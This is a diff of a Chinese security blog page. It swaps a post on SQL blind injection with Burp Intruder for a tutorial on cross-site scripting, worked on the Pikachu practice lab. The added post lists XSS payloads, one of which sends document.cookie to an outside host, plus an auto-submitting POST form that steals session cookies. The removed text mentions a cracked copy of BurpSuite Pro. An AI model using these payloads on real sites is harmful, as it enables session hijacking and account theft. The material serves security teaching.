@@ -103,23 +103,27 @@
   };
 </script>
 
-  <meta name="description" content="一、实验环境 Pikachu漏洞联系平台 （Windows+Phpstudy环境） 火狐浏览器（附带插件HackBar与FoxyProxy） BurpSuite_Pro v1.7.26 破解版 漏洞平台地址为：http://192.168.31.193/pika  二、Burpsuite——Intruder模块简介Burp Intruder是一个强大的工具，用于自动对Web应用程序自定义的攻击，">
-<meta name="keywords" content="SQL注入">
+  <meta name="description" content="漏洞简述跨站脚本攻击（XSS），是目前最普遍的Web应用安全漏洞。这类漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。 漏洞攻击流程 发现XSS漏洞 根据XSS漏洞类型，设定恶意代码注入至页面当中 诱导或等待用户访问该页面后将会自动执行恶意代码 根据攻击者所设定的恶意代码(如窃取用户cookie)，">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQL盲注进阶——BurpSuite">
-<meta property="og:url" content="http://yoursite.com/2019/08/01/SQL盲注注入进阶/index.html">
+<meta property="og:title" content="XSS 跨站脚本攻击">
+<meta property="og:url" content="http://yoursite.com/2019/08/27/XSS跨站脚本/index.html">
 <meta property="og:site_name" content="OldSix-Sec">
-<meta property="og:description" content="一、实验环境 Pikachu漏洞联系平台 （Windows+Phpstudy环境） 火狐浏览器（附带插件HackBar与FoxyProxy） BurpSuite_Pro v1.7.26 破解版 漏洞平台地址为：http://192.168.31.193/pika  二、Burpsuite——Intruder模块简介Burp Intruder是一个强大的工具，用于自动对Web应用程序自定义的攻击，">
+<meta property="og:description" content="漏洞简述跨站脚本攻击（XSS），是目前最普遍的Web应用安全漏洞。这类漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。 漏洞攻击流程 发现XSS漏洞 根据XSS漏洞类型，设定恶意代码注入至页面当中 诱导或等待用户访问该页面后将会自动执行恶意代码 根据攻击者所设定的恶意代码(如窃取用户cookie)，">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://yoursite.com/images/SQL-Inject/6-1.png">
-<meta property="og:image" content="http://yoursite.com/images/SQL-Inject/6-2.png">
-<meta property="og:image" content="http://yoursite.com/images/SQL-Inject/6-3.png">
-<meta property="og:image" content="http://yoursite.com/images/SQL-Inject/6-4.png">
-<meta property="og:updated_time" content="2019-08-09T05:41:59.238Z">
+<meta property="og:image" content="http://yoursite.com/images/XSS/1-1.png">
+<meta property="og:image" content="http://yoursite.com/images/XSS/1-2.png">
+<meta property="og:image" content="http://yoursite.com/images/XSS/1-3.png">
+<meta property="og:image" content="http://yoursite.com/images/XSS/1-4.png">
+<meta property="og:image" content="http://yoursite.com/images/XSS/1-5.png">
+<meta property="og:image" content="http://yoursite.com/images/XSS/1-6.png">
+<meta property="og:image" content="http://yoursite.com/images/XSS/2-1.png">
+<meta property="og:image" content="http://yoursite.com/images/XSS/2-2.png">
+<meta property="og:image" content="http://yoursite.com/images/XSS/2-3.png">
+<meta property="og:updated_time" content="2019-08-27T14:22:32.176Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="SQL盲注进阶——BurpSuite">
-<meta name="twitter:description" content="一、实验环境 Pikachu漏洞联系平台 （Windows+Phpstudy环境） 火狐浏览器（附带插件HackBar与FoxyProxy） BurpSuite_Pro v1.7.26 破解版 漏洞平台地址为：http://192.168.31.193/pika  二、Burpsuite——Intruder模块简介Burp Intruder是一个强大的工具，用于自动对Web应用程序自定义的攻击，">
-<meta name="twitter:image" content="http://yoursite.com/images/SQL-Inject/6-1.png">
+<meta name="twitter:title" content="XSS 跨站脚本攻击">
+<meta name="twitter:description" content="漏洞简述跨站脚本攻击（XSS），是目前最普遍的Web应用安全漏洞。这类漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。 漏洞攻击流程 发现XSS漏洞 根据XSS漏洞类型，设定恶意代码注入至页面当中 诱导或等待用户访问该页面后将会自动执行恶意代码 根据攻击者所设定的恶意代码(如窃取用户cookie)，">
+<meta name="twitter:image" content="http://yoursite.com/images/XSS/1-1.png">
 
 
 
@@ -127,7 +131,7 @@
 
   
   
-  <link rel="canonical" href="http://yoursite.com/2019/08/01/SQL盲注注入进阶/">
+  <link rel="canonical" href="http://yoursite.com/2019/08/27/XSS跨站脚本/">
 
 
 
@@ -138,7 +142,7 @@
 </script>
 
   
-  <title>SQL盲注进阶——BurpSuite | OldSix-Sec</title>
+  <title>XSS 跨站脚本攻击 | OldSix-Sec</title>
   
 
 
@@ -354,7 +358,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/01/SQL盲注注入进阶/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/27/XSS跨站脚本/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Shu Shen">
@@ -371,7 +375,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">SQL盲注进阶——BurpSuite
+          <h1 class="post-title" itemprop="name headline">XSS 跨站脚本攻击
 
               
             
@@ -397,23 +401,13 @@
                 
               
 
-              <time title="创建时间：2019-08-01 15:57:33" itemprop="dateCreated datePublished" datetime="2019-08-01T15:57:33+08:00">2019-08-01</time>
+              <time title="创建时间：2019-08-27 10:08:16 / 修改时间：22:22:32" itemprop="dateCreated datePublished" datetime="2019-08-27T10:08:16+08:00">2019-08-27</time>
             </span>
           
 
           
             
 
-            
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2019-08-09 13:41:59" itemprop="dateModified" datetime="2019-08-09T13:41:59+08:00">2019-08-09</time>
-              </span>
             
           
 
@@ -440,7 +434,7 @@
                   ，
                 
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/WEB安全/PHP/SQL注入/" itemprop="url" rel="index"><span itemprop="name">SQL注入</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/WEB安全/PHP/XSS/" itemprop="url" rel="index"><span itemprop="name">XSS</span></a></span>
 
                 
                 
@@ -475,21 +469,32 @@
       
 
       
-        <a id="more"></a>
-<h2 id="一、实验环境"><a href="#一、实验环境" class="headerlink" title="一、实验环境"></a>一、实验环境</h2><ul>
-<li>Pikachu漏洞联系平台 （Windows+Phpstudy环境）</li>
-<li>火狐浏览器（附带插件HackBar与FoxyProxy）</li>
-<li>BurpSuite_Pro v1.7.26 破解版</li>
-<li>漏洞平台地址为：<a href="http://192.168.31.193/pika" target="_blank" rel="noopener">http://192.168.31.193/pika</a></li>
-</ul>
-<h2 id="二、Burpsuite——Intruder模块简介"><a href="#二、Burpsuite——Intruder模块简介" class="headerlink" title="二、Burpsuite——Intruder模块简介"></a>二、Burpsuite——Intruder模块简介</h2><p>Burp Intruder是一个强大的工具，用于自动对Web应用程序自定义的攻击，Burp Intruder 是高度可配置的，并被用来在广范围内进行自动化攻击。你可以使用 Burp Intruder 方便地执行许多任务，包括枚举标识符，获取有用数据，漏洞模糊测试。合适的攻击类型取决于应用程序的情况，可能包括：缺陷测试：SQL 注入，跨站点脚本，缓冲区溢出，路径遍历；暴力攻击认证系统；枚举；操纵参数；拖出隐藏的内容和功能；会话令牌测序和会话劫持；数据挖掘；并发攻击；应用层的拒绝服务式攻击。</p>
-<h2 id="三、Intruder模块说明"><a href="#三、Intruder模块说明" class="headerlink" title="三、Intruder模块说明"></a>三、Intruder模块说明</h2><p>Burp Intruder主要有四个模块组成:<br>1：Target 用于配置目标服务器进行攻击的详细信息。<br>2：Positions  设置Payloads的插入点以及攻击类型（攻击模式）。<br>3：Payloads  设置payload，配置字典<br>4：Opetions   此选项卡包含了request headers，request engine，attack results ，grep match，grep_extrack，grep payloads和redirections。你可以发动攻击之前，在主要Intruder的UI上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。</p>
-<h2 id="四、搭配Intruder自动爆破数据库"><a href="#四、搭配Intruder自动爆破数据库" class="headerlink" title="四、搭配Intruder自动爆破数据库"></a>四、搭配Intruder自动爆破数据库</h2><ol>
-<li>将截断的数据包发送至Intruder<br><img src="/images/SQL-Inject/6-1.png" alt="图6-1"></li>
-<li>设置Pyloads的插入点<br><img src="/images/SQL-Inject/6-2.png" alt="图6-2"></li>
-<li>设置Pyload，导入字典<br><img src="/images/SQL-Inject/6-3.png" alt="图6-3"></li>
-<li>启动自动攻击<br>观察攻击运行至什么pyload时，会停留延时<br><img src="/images/SQL-Inject/6-4.png" alt="图6-4"></li>
+        <h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><p>跨站脚本攻击（XSS），是目前最普遍的Web应用安全漏洞。这类漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。</p>
+<h2 id="漏洞攻击流程"><a href="#漏洞攻击流程" class="headerlink" title="漏洞攻击流程"></a>漏洞攻击流程</h2><ol>
+<li>发现XSS漏洞</li>
+<li>根据XSS漏洞类型，设定恶意代码注入至页面当中</li>
+<li>诱导或等待用户访问该页面后将会自动执行恶意代码</li>
+<li>根据攻击者所设定的恶意代码(如窃取用户cookie)，来进行后续攻击</li>
 </ol>
+<p><img src="/images/XSS/1-1.png" alt></p>
+<h2 id="XSS-漏洞类型"><a href="#XSS-漏洞类型" class="headerlink" title="XSS 漏洞类型"></a>XSS 漏洞类型</h2><ul>
+<li>反射型（非持久性）<br>  交互的数据一般不会被存在数据库里面，一次性，所见即所得，通常出现在查询类页面中</li>
+<li>存储型（持久性）<br>  交互的数据会被存在数据库里面，永久性存储，通常出现在留言板，注册等页面</li>
+<li>DOM 型<br>  不与后台服务器产生数据交互，是一种DOM操作前段代码输出的产生的问题，一次性也属于反射型</li>
+</ul>
+<h2 id="反射型xss-GET-实验示例"><a href="#反射型xss-GET-实验示例" class="headerlink" title="反射型xss(GET)实验示例"></a>反射型xss(GET)实验示例</h2><p>GET请求是诱导用户点击经过攻击者定制的包含恶意攻击代码的URL以达到窃取用户cookie，钓鱼等目的</p>
+<p>Poc：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- &lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;</span><br><span class="line">- &lt;a href=&apos;&apos; onclick=alert(&apos;xss&apos;)&gt;type&lt;/a&gt;</span><br><span class="line">- &lt;img src=http://1.1.1.1/a.ipg onerror=alert(&apos;xss&apos;)&gt;</span><br><span class="line">- &lt;script&gt;window.location=&apos;http://1.1.1.1&apos;&lt;/script&gt;</span><br><span class="line">- &lt;iframe SRC=&quot;http://1.1.1.1/victim&quot; height = &quot;0&quot; width =&quot;0&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">- &lt;script&gt;new Image().src=&quot;http://1.1.1.1/c.php?output=&quot;+document.cookie;&lt;/script&gt;</span><br><span class="line">- &lt;script&gt;document.body.innerHTML=&quot;&lt;div style=visibility:visible;&gt;&lt;h1&gt;THIS WEBSITE IS UNDER ATTACK&lt;/h1&gt;&lt;/div&gt;&quot;;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在浏览器表单中输入AAAAA<br><img src="/images/XSS/1-2.png" alt><br>查看源代码，用户提交的数据原封不动的返回了客户端，说明可能存在XSS 攻击漏洞<br><img src="/images/XSS/1-3.png" alt><br>注入JavaScript代码，发现表单参数输入被限制在20个字符<br><img src="/images/XSS/1-4.png" alt><br>修改前端限制字符长度的HTML代码<br><img src="/images/XSS/1-5.png" alt><br>再次注入JavaScript代码<br><code>出现弹窗内容为XSS，说明存在XSS漏洞</code><br><img src="/images/XSS/1-6.png" alt><br><code>由于该网页传参方式为GET，其实可以直接在URL中传参，前端限制无法影响URL到后端的传参</code></p>
+<h2 id="反射型xss-POST-实验示例"><a href="#反射型xss-POST-实验示例" class="headerlink" title="反射型xss(POST)实验示例"></a>反射型xss(POST)实验示例</h2><p><img src="/images/XSS/2-1.png" alt></p>
+<p>POST请求区别与GET请求，POST请求无法通过定制的URL让用户向服务器提交数据。所以为了达到目的，需要攻击者搭建一个网站在网页内写入一个自动向服务器提交恶意代码的POST表单，而后诱导用户在登入用户的状态下访问该网站，在用户访问该网站时代码将自动将cookie发送给攻击者。</p>
+<p>POST表单代码如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">window.onload=function()&#123; 	//访问页面时，自动提交表单</span><br><span class="line">	document.getElementById("postsubmit").click(); </span><br><span class="line">&#125;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span>&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>							 	//XSS漏洞页面URL</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/pika/vul/xss/xsspost/xss_reflected_post.php"</span>&gt;</span>			/script窃取cookie的恶意代码</span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"xss_in"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"message"</span> <span class="attr">value</span>=<span class="string">"&lt;script&gt; document.location = 'http://127.0.0.1/pika/pkxss/xcookie/cookie.php?cookie=' + document.cookie; &lt;/script&gt;"</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"postsubmit"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="被害用户视角模拟："><a href="#被害用户视角模拟：" class="headerlink" title="被害用户视角模拟："></a>被害用户视角模拟：</h3><p>登陆用户至漏洞页面<br><img src="/images/XSS/2-2.png" alt></p>
+<p>访问恶意网站<code>http://127.0.0.1/cook.html</code><br>数据提交成功后将自动重定向至pikachu主页</p>
+<p>查看XSS后台cookie资料<br><img src="/images/XSS/2-3.png" alt></p>
 
       
     </div>
@@ -515,15 +520,6 @@
 
     <footer class="post-footer">
       
-        
-          
-        
-        <div class="post-tags">
-          
-            <a href="/tags/SQL注入/" rel="tag"># SQL注入</a>
-          
-        </div>
-      
 
       
       
@@ -533,8 +529,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/07/30/SQL注入-盲注/" rel="next" title="SQL盲注注入">
-                <i class="fa fa-chevron-left"></i> SQL盲注注入
+              <a href="/2019/08/26/Centos7-2搭建LNMP/" rel="next" title="Centos7.2搭建LNMP">
+                <i class="fa fa-chevron-left"></i> Centos7.2搭建LNMP
               </a>
             
           </div>
@@ -543,8 +539,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/08/04/文件包含与目录遍历/" rel="prev" title="文件包含与目录遍历">
-                文件包含与目录遍历 <i class="fa fa-chevron-right"></i>
+              <a href="/9102/01/01/top/" rel="prev" title="置顶">
+                置顶 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -712,7 +708,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、实验环境"><span class="nav-number">1.</span> <span class="nav-text">一、实验环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、Burpsuite——Intruder模块简介"><span class="nav-number">2.</span> <span class="nav-text">二、Burpsuite——Intruder模块简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、Intruder模块说明"><span class="nav-number">3.</span> <span class="nav-text">三、Intruder模块说明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四、搭配Intruder自动爆破数据库"><span class="nav-number">4.</span> <span class="nav-text">四、搭配Intruder自动爆破数据库</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞简述"><span class="nav-number">1.</span> <span class="nav-text">漏洞简述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞攻击流程"><span class="nav-number">2.</span> <span class="nav-text">漏洞攻击流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-漏洞类型"><span class="nav-number">3.</span> <span class="nav-text">XSS 漏洞类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反射型xss-GET-实验示例"><span class="nav-number">4.</span> <span class="nav-text">反射型xss(GET)实验示例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反射型xss-POST-实验示例"><span class="nav-number">5.</span> <span class="nav-text">反射型xss(POST)实验示例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#被害用户视角模拟："><span class="nav-number">5.1.</span> <span class="nav-text">被害用户视角模拟：</span></a></li></ol></li></ol></div>
             
 
           </div>
